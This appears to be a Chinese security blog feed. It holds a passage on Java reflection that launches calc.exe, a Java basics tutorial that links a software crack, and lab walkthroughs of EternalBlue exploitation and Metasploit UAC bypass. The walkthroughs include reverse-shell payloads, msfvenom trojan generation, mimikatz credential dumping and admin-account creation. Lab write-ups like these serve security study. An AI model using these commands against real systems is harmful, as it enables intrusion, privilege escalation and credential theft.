传参时应当传入一个二维数组。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz =  Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">            clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getDeclaredConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="执行私有方法"><a href="#执行私有方法" class="headerlink" title="执行私有方法"></a>执行私有方法</h2><p>这里考虑最后一种情况，构造方法为私有的情况，这次依然以<code>Runtime</code>类为例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">//获取Class类对象</span></span><br><span class="line">            Class clazz =  Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">            <span class="comment">//获取指定构造方法</span></span><br><span class="line">            Constructor cs = clazz.getDeclaredConstructor();</span><br><span class="line">            <span class="comment">//设置为可访问权限</span></span><br><span class="line">            cs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="comment">//调用执行</span></span><br><span class="line">            clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(cs.newInstance(),<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.yuque.com/ni4n/blogs/rkyeg8#9qnJO">Java安全之反射机制</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java环境配置与基础语法</title>
      <link href="posts/52074.html"/>
      <url>posts/52074.html</url>
      
        <content type="html"><![CDATA[<h1 id="Java简介"><a href="#Java简介" class="headerlink" title="Java简介"></a>Java简介</h1><h2 id="Java-体系"><a href="#Java-体系" class="headerlink" title="Java 体系"></a>Java 体系</h2><ol><li>Java SE（标准版）</li><li>Java EE（企业版）</li><li>Java ME（精简版）</li></ol><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/javase.png"></p><h2 id="Java-特性"><a href="#Java-特性" class="headerlink" title="Java 特性"></a>Java 特性</h2><ul><li>结构严谨，面向对象</li><li>跨平台（Java源代码默认编译结果为平台通用的字节码）</li><li>安全性优越（提供了一种相对安全的内存管理和访问机制，避免了绝大部分的内存泄露和指针越界问题）</li><li>多线程</li><li>分布式</li><li>完善的应用程序接口</li><li>大量的第三方类库</li></ul><h2 id="jdk？jre？jvm？"><a href="#jdk？jre？jvm？" class="headerlink" title="jdk？jre？jvm？"></a>jdk？jre？jvm？</h2><ol><li><p>jdk(Java development kit)：java开发工具包，支持Java程序开发的最小环境，即如果你要进行Java开发，你至少要在你的开发机器上安装JDK。</p><p><strong>JDK = Java程序设计语言+Java虚拟机+Java API类库</strong></p></li><li><p>jre(Java Runtime Environment)：java运行环境，支持Java程序运行的标准环境，如果你不需要进行Java程序开发，只是要运行Java程序，例如运行Jar文件，那么你可以在你的运行机器上只安装JRE。</p><p>**JRE = Java虚拟机 +Java API类库中的Java SE API子集 **</p></li><li><p>jvm(Java Virtual Machine)：java虚拟机 ，其主要任务为将字节码装载到内部，解释/编译为对应平台上的机器指令执行。</p></li></ol><h2 id="Java程序"><a href="#Java程序" class="headerlink" title="Java程序"></a>Java程序</h2><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/javachengxu.png"></p><p>过程：<strong>首先我们使用Java编程语言编写好Java程序的源代码，然后Java前端编译器负责将源代码编译为字节码，接着Java虚拟机负责将编译好的字节码装载进内部，解释/编译为对应平台上的机器指令运行。</strong></p><h1 id="Java-环境配置"><a href="#Java-环境配置" class="headerlink" title="Java 环境配置"></a>Java 环境配置</h1><p><strong>JDK下载</strong></p><p><a href="https://www.oracle.com/java/technologies/javase-downloads.html">https://www.oracle.com/java/technologies/javase-downloads.html</a></p><p>配置环境变量</p><p>测试是否安装成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure><p><strong>IntelliJ IDEA官方下载</strong></p><p><a href="https://www.jetbrains.com/zh-cn/idea/download/#section=windows">https://www.jetbrains.com/zh-cn/idea/download/#section=windows</a> 【需付费使用，可免费使用30天】</p><p><strong>IDEA破解</strong></p><p><a href="https://www.cxyxiaowu.com/14400.html">https://www.cxyxiaowu.com/14400.html</a></p><p><strong>IDEA配置</strong></p><p><a href="https://blog.csdn.net/DwZ735660836/article/details/115499367?spm=1001.2014.3001.5501">https://blog.csdn.net/DwZ735660836/article/details/115499367?spm=1001.2014.3001.5501</a></p><p>使用IDEA运行第一个Java程序</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210716112614570.png" alt="image-20210716112614570"></p><h1 id="Java基础语法"><a href="#Java基础语法" class="headerlink" title="Java基础语法"></a>Java基础语法</h1><h2 id="Helloworld代码"><a href="#Helloworld代码" class="headerlink" title="Helloworld代码"></a>Helloworld代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello,world!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/javayufa.jpg"></p><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><ul><li><strong>大小写敏感</strong></li><li><strong>类名的首字母大写</strong></li><li><strong>方法名</strong>：所有的方法名都应该以小写字母开头。如果方法名含有若干单词，则后面的每个单词首字母大写。</li><li><strong>源文件名</strong>：源文件名必须和类名相同。（如果文件名和类名不相同则会导致编译错误）。</li><li><strong>主方法入口</strong>：所有的 Java 程序由 <strong>public static void main(String[] args)</strong> 方法开始执行。</li></ul><h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><ol><li>标识符由字母、数字、_(下划线)、$所组成，其中不能以数字开头，不能用Java中的保留字（关键字）</li><li>标识符采用有意义的简单命名</li></ol><p><strong>命名规范（驼峰命名法）</strong></p><ul><li>类名和接口名：每个单词的首字母大写，其余为小写。（大驼峰）</li><li>方法名：第二个单词起的首字母为大写，其余全为小写。（小驼峰）</li><li>常量名：基本数据类型的常量名使用全部大写字母，字与字之间用下划线分隔。</li></ul><h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><p>访问控制修饰符</p><table><thead><tr><th align="center">关键字</th><th align="left">含义</th></tr></thead><tbody><tr><td align="center">private</td><td align="left">私有权限，修饰的属性和方法仅供本类引用</td></tr><tr><td align="center">protected</td><td align="left">保护权限，保护子类，当前包内和继承的子类中可以引用</td></tr><tr><td align="center">default</td><td align="left">默认模式，不写任何访问修饰权限，本包内可以使用</td></tr><tr><td align="center">public</td><td align="left">公用模式，可跨包使用，凡是环境下的类和方法都可以使用，需导入包</td></tr></tbody></table><p>其他修饰符</p><table><thead><tr><th align="center">关键字</th><th align="left">含义</th></tr></thead><tbody><tr><td align="center">abstract</td><td align="left">表明类或者成员方法具有抽象属性</td></tr><tr><td align="center">final</td><td align="left">终结器，表明一个类不能派生出子类，或者成员方法不能被覆盖，或者成员域的值不能被改变，用来定义常量</td></tr><tr><td align="center">static</td><td align="left">表示具有静态属性</td></tr><tr><td align="center">synchronized</td><td align="left">线程同步，修饰一段代码表示多个线程都能同步执行</td></tr></tbody></table><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>Java 中主要有如下几种类型的变量</p><ul><li>局部变量</li><li>类变量（静态变量）</li><li>成员变量（非静态变量）</li></ul><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">   <span class="comment">/* 这是第一个Java程序</span></span><br><span class="line"><span class="comment">    * 它将输出 Hello World</span></span><br><span class="line"><span class="comment">    * 这是一个多行注释的示例</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">       <span class="comment">// 这是单行注释的示例</span></span><br><span class="line">       <span class="comment">/* 这个也是单行注释的示例 */</span></span><br><span class="line">       System.out.println(<span class="string">&quot;Hello World&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="https://blog.csdn.net/qq_39091292/article/details/84859611">JAVA体系结构</a></p><p>[2] <a href="https://blog.csdn.net/DwZ735660836/article/details/115485354?spm=1001.2014.3001.5502">java开发配套工具下载地址和介绍</a></p><p>[3] <a href="https://blog.csdn.net/weixin_42318912/article/details/114176738?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">idea创建java项目目录结构_使用IDEA创建java项目的步骤详解（hello word）</a></p><p>[4] <a href="https://www.runoob.com/java/java-basic-syntax.html">https://www.runoob.com/java/java-basic-syntax.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ms17_010-永恒之蓝复现</title>
      <link href="posts/61895.html"/>
      <url>posts/61895.html</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><ul><li>Metasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。</li><li>ms17_010是一个安全类型的补丁，用来修补Windows操作系统中存在的一个基于SMB服务展现出来的一个漏洞，此漏洞利用445端口执行，原本是作为局域网共享使用的一个端口，但恶意人员可以利用此端口偷偷的执行共享服务或者其他命令执行操作。此ms17_010漏洞主要是针对于Windows7及以前的操作系统暴露出来的安全问题。</li><li>永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该病毒出来不久就被微软通过打补丁修复。</li><li>SMB（全称是Server Message Block）是一个协议服务器信息块，它是一种客户机/服务器、请求/响应协议，通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP/IP协议之上，SMB使用TCP139端口和TCP445端口。</li></ul><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><p>攻击机：kali 192.168.47.130</p><p>靶机：windows7 192.168.47.128</p><p><strong>当使用nmap或其他工具发现目标及上有445端口开启，可以考虑检测是否存在永恒之蓝</strong></p><p>使用ping命令测试两台机器间网络是否互通（windows7记得关闭防火墙！）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210730162236059.png" alt="image-20210730162236059"></p><p>在kali中启动metasploit</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p>搜索ms17_010相关漏洞利用模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210730162921120.png" alt="image-20210730162921120"></p><p>使用扫描模块（扫描目标机器是否存在此漏洞）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br></pre></td></tr></table></figure><p>设置扫描的网段范围</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.47.0&#x2F;24</span><br></pre></td></tr></table></figure><p>设置扫描的线程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set threads 50</span><br></pre></td></tr></table></figure><p>开始扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p>扫描结束后，从结果中可以看到在当前扫描的网段中存在一个windows7的操作系统存在ms17_010漏洞</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210730165507338.png" alt="image-20210730165507338"></p><p>接下来进行漏洞利用，使用漏洞利用模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure><p>设置漏洞利用完成后的反弹模块，用以接收回馈信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p>设置反弹ip地址（即kali攻击机ip）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> lhost 192.168.47.130</span><br></pre></td></tr></table></figure><p>设置反弹端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lport 6666</span><br></pre></td></tr></table></figure><p>设置被攻击的目标主机ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhost 192.168.47.128</span><br></pre></td></tr></table></figure><p>检查设置的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210730170329121.png" alt="image-20210730170329121"></p><p>准备工作完成，进行攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210730170632714.png" alt="image-20210730170632714"></p><p>后续利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getsystem // 提权</span><br><span class="line">getuid // 查看当前用户身份</span><br><span class="line">sysinfo // 查看系统信息</span><br><span class="line">screenshot // 截屏</span><br><span class="line">webcam_list //查看目标摄像头设备列表</span><br><span class="line">shell // 进入靶机cmd（如果出现乱码的话执行chcp 65001）</span><br></pre></td></tr></table></figure><p>上传文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload  &#x2F;aaa.exe  c:&#x2F;&#x2F; </span><br><span class="line">&#x2F;&#x2F;在kali根目录下创建了一个aaa.exe的文件，将其上传至目标操作系统当中C盘下</span><br></pre></td></tr></table></figure><p>获取密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz &#x2F;&#x2F;加载获取密码的模块</span><br><span class="line">creds_msv &#x2F;&#x2F;获取密文hash值</span><br><span class="line">creds_kerberos &#x2F;&#x2F;获取明文密码****</span><br></pre></td></tr></table></figure><p><strong>远程桌面连接靶机</strong></p><ol><li><p>查看靶机端口开放情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an</span><br></pre></td></tr></table></figure><p>如果没有开启3389端口，可以在cmd中使用以下命令开启（Win7、Win2003、XP系统）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure></li><li><p>创建用户名密码 blue/blue </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user blue blue /add </span><br></pre></td></tr></table></figure><p>将用户blue添加入管理组 （不加入会连接不上） </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators blue /add</span><br></pre></td></tr></table></figure></li><li><p>远程桌面连接（<strong>这里前提是目标机不是普通的家庭版，要支持远程连接</strong>）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.47.128:3389</span><br></pre></td></tr></table></figure><p>防范措施：</p></li></ol><ul><li>关闭445等高危端口</li><li>配置防火墙，安装防护软件</li><li>安装补丁</li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过UAC</title>
      <link href="posts/52267.html"/>
      <url>posts/52267.html</url>
      
        <content type="html"><![CDATA[<h1 id="什么是UAC？"><a href="#什么是UAC？" class="headerlink" title="什么是UAC？"></a>什么是UAC？</h1><p>用户帐户控制，通常简称 UAC，是 Windows Vista 和 Windows Server 2008中引入的 Windows 安全组件。UAC 尽可能限制进程对管理级(特权)资源和操作的访问，除非用户明确授予这些权限。换句话说，它是Windows的一个安全功能，它支持防止对操作系统进行未经授权的修改，UAC确保仅在管理员授权的情况下进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且Windows系统保持不变。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210721141732437.png" alt="image-20210721141732437"></p><h1 id="UAC如何运行？"><a href="#UAC如何运行？" class="headerlink" title="UAC如何运行？"></a>UAC如何运行？</h1><p>UAC通过阻止程序执行任何涉及有关系统更改/特定任务的任务来运行。除非尝试执行这些操作的进程以管理员权限运行，否则这些操作将无法运行。如果您以管理员身份运行程序，则它将具有更多权限，因为它将被“提升权限”，而不是以管理员身份运行的程序。</p><p>一些没有管理员权限无法完成的操作：</p><ul><li>注册表修改（如果注册表项在HKEY_LOCAL_MACHINE下（因为它影响多个用户），它将是只读的）</li><li>加载设备驱动程序</li><li>DLL注入</li><li>修改系统时间（时钟）</li><li>修改用户帐户控制设置（通过注册表，可以启用/禁用该设置，但您需要正确的权限才能执行此操作）</li><li>修改受保护的目录（例如Windows文件夹，Program Files）</li><li>计划任务（例如，以管理员权限自动启动）</li></ul><p>UAC不会自动阻止恶意软件，其目的不是确定程序是否是恶意软件。这同样取决于用户。如果将以管理员权限执行程序，则将提醒用户并且需要用户确认。 </p><h1 id="绕过UAC的方法"><a href="#绕过UAC的方法" class="headerlink" title="绕过UAC的方法"></a>绕过UAC的方法</h1><ul><li>攻击机：kali Linux 192.168.232.133</li><li>靶机：windows7 192.168.232.135</li></ul><p>首先通过exploit获得目标主机的meterprter。</p><p>生成木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.232.133 lport&#x3D;4444 -f exe -o payload.exe</span><br></pre></td></tr></table></figure><p>启用MSF监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 192.168.232.133</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>投放木马并运行，获得meterpreter会话</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210721143926903.png" alt="image-20210721143926903"></p><p>查看是否有system权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure><p>如果没有系统/管理员权限，那么就可以尝试绕过目标系统的UAC保护。</p><p>输入<code>background</code>将获取到的会话转入后台，更换其他exp进行提权操作。</p><h2 id="方法一：Windows权限升级绕过UAC保护"><a href="#方法一：Windows权限升级绕过UAC保护" class="headerlink" title="方法一：Windows权限升级绕过UAC保护"></a>方法一：Windows权限升级绕过UAC保护</h2><p>此模块将通过进程注入利用受信任的发布者证书绕过Windows UAC。这将产生第二个shell，而且UAC保护已经关闭。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class="line">msf exploit windows&#x2F;local&#x2F;bypassuac) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac) &gt; exploit</span><br></pre></td></tr></table></figure><p>从下图可以看到，又建立了一个meterpreter会话2连接，现在输入getsystem和getuid两条命令来查看系统权限。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210721144920680.png" alt="image-20210721144920680"></p><h2 id="方法二：内存注入"><a href="#方法二：内存注入" class="headerlink" title="方法二：内存注入"></a>方法二：内存注入</h2><p>此模块将通过进程注入利用受信任的发布者证书绕过Windows UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块使用反射DLL注入技术仅删除DLLpayload二进制文件而不是删除标准技术中的三个单独的二进制文件。但是，它需要选择正确的体系结构（对于SYSWOW64系统也使用x64）。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_injection) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_injection) &gt; exploit</span><br></pre></td></tr></table></figure><h2 id="方法三：通过FodHelper注册表项"><a href="#方法三：通过FodHelper注册表项" class="headerlink" title="方法三：通过FodHelper注册表项"></a>方法三：通过FodHelper注册表项</h2><p>此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块修改注册表项，但在调用payload后清除该项。该模块不要求payload的结构与OS匹配。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_fodhelper</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_fodhelper) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_fodhelper) &gt; exploit</span><br></pre></td></tr></table></figure><h2 id="方法四：通过Eventvwr注册表项"><a href="#方法四：通过Eventvwr注册表项" class="headerlink" title="方法四：通过Eventvwr注册表项"></a>方法四：通过Eventvwr注册表项</h2><p>此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入自定义命令，这个命令将在启动Windows fodhelper.exe应用程序时调用来绕过Windows 10 UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块修改注册表项，但在调用payload后清除该项。该模块不要求payload的结构与OS匹配。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; exploit</span><br></pre></td></tr></table></figure><h2 id="方法五：通过COM处理程序劫持"><a href="#方法五：通过COM处理程序劫持" class="headerlink" title="方法五：通过COM处理程序劫持"></a>方法五：通过COM处理程序劫持</h2><p>此模块将通过在HKCU配置单元中创建COM处理程序注册表项来绕过Windows UAC。加载某些高完整性进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL。这些DLL包含导致会话升级的payload。在payload调用后清除注册表项修改。此模块要求payload的体系结构与OS匹配，但当前的低权限Meterpreter会话的体系结构并不相同。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件。因此，如果限制cmd.exe访问，则此模块将无法正常运行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_comhijack</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_comhijack) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_comhijack) &gt; exploit</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&mid=2247489975&idx=2&sn=31e8c3ff4a277f3e9f41de2f4b40dc3d&chksm=e916c98dde61409b4a819cb1b38e377d0283853d95abb69a76bd1ff49e53579a8589baacd3e5&mpshare=1&scene=23&srcid=##">利用metasploit绕过UAC的5种方式</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透初探 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼之office宏攻击</title>
      <link href="posts/38051.html"/>
      <url>posts/38051.html</url>
      
